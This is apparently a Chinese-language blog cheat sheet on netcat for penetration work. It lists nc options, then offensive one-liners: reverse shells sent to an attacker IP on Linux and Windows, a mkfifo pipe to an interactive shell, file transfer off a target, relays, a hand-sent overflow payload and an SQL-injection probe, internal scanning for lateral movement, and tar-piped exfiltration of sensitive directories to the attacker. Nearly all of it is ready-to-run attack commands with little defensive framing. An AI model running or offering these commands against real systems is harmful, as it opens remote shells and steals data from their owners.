---
title: 反向shell
categories:
  - cybersec
description: 反向shell
date: 2025-03-17 12:31:27
tags:
---

```bash

语法：nc [-hlnruz][-g<网关...>][-G<指向器数目>][-i<延迟秒数>][-o<输出文件>][-p<通信端口>]
		  [-s<来源位址>][-v...][-w<超时秒数>][主机名称][通信端口...]
参数：
  -g<网关>         设置路由器跃程通信网关，最多可设置8个。
  -G<指向器数目>   设置来源路由指向器，其数值为4的倍数。
  -h               在线帮助。
  -i<延迟秒数>     设置时间间隔，以便传送信息及扫描通信端口。
  -l               监听模式，用于入站连接 (监听本地端口)。
  -n               直接使用IP地址，而不通过域名服务器。
  -o<输出文件>     指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。
  -p<通信端口>     设置本地主机使用的通信端口。
  -r               随机指定本地与远端主机的通信端口。
  -s<来源位址>     设置本地主机送出数据包的IP地址。
  -u               使用UDP传输协议。
  -v               显示指令执行过程。
  -w<超时秒数>     设置等待连线的时间。
  -z               使用0输入/输出模式，只在扫描通信端口时使用。
 
```
# 信息收集

## 验证目标主机是否开放特定端口

`nc -zv 目标IP 端口范围  # 例：nc -zv 192.168.1.100 20-443`  

## 获取服务指纹信息（如SSH、HTTP版本）

`echo "HEAD / HTTP/1.0\n\n" | nc 目标IP 80`

# 建立反向 shell

## 1.攻击者监听端口

`nv -lvnp 4444`

## 2.目标机连接攻击者

```bash

# linux
nc -e /bin/bash 攻击者IP 4444  # 直接反弹Shell

## 无 -e 参数时

mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 攻击者IP 4444 > /tmp/f # 使用管道实现交互式Shell

# Windows
nc.exe 攻击者IP 4444 -e cmd.exe

```

# 文件传输

## 发送文件到目标

```bash

# 接收方（攻击者）监听：
nc -lvnp 4444 > received_file

# 发送方（目标）上传文件：
nc 攻击者IP 4444 < 本地文件

```

## 从目标下载文件

```bash
# 接收方（攻击者）准备接收：
nc -lvnp 4444 > 保存路径/文件名

# 发送方（目标）发送文件：
nc 攻击者IP 4444 < 目标文件

```

# 端口转发与代理

## 简单端口转发

将本地端口流量转发到远程主机：

`nc -lvnp 本地端口 -c "nc 目标IP 目标端口"`

## 双向中继（Relay）

通过命名管道实现双向流量转发：
```Bash
mkfifo /tmp/pipe
nc -lvnp 4444 < /tmp/pipe | nc 目标IP 80 > /tmp/pipe
```

# 网络隧道

```Bash
# 目标机通过80端口连接攻击者：
nc 攻击者IP 80 -e /bin/bash

# 加密隧道（需配合其他工具）
# 使用cryptcat（加密版nc）或ncat（支持SSL）：
ncat --ssl -lvnp 4444  # 监听加密端口

```

# 漏洞利用辅助

```bash

# 手工发送Payload
# 测试缓冲区溢出或注入漏洞时直接发送数据：
echo -e "AAAA...恶意Payload..." | nc 目标IP 漏洞端口

# HTTP请求构造
# 快速发送自定义请求测试Web漏洞（如SQL注入）：
echo -e "GET /page?id=1' AND 1=1-- HTTP/1.1\nHost: target.com\n\n" | nc target.com 80
```

# 后渗透利用

```bash
# 横向移动
# 通过已控制的机器作为跳板扫描内网：
nc -zv 内网IP 端口范围

# 数据外传
# 窃取敏感文件后通过DNS或ICMP隧道外传（需配合其他工具）：
tar zcf - 敏感目录 | nc 攻击者IP 4444

```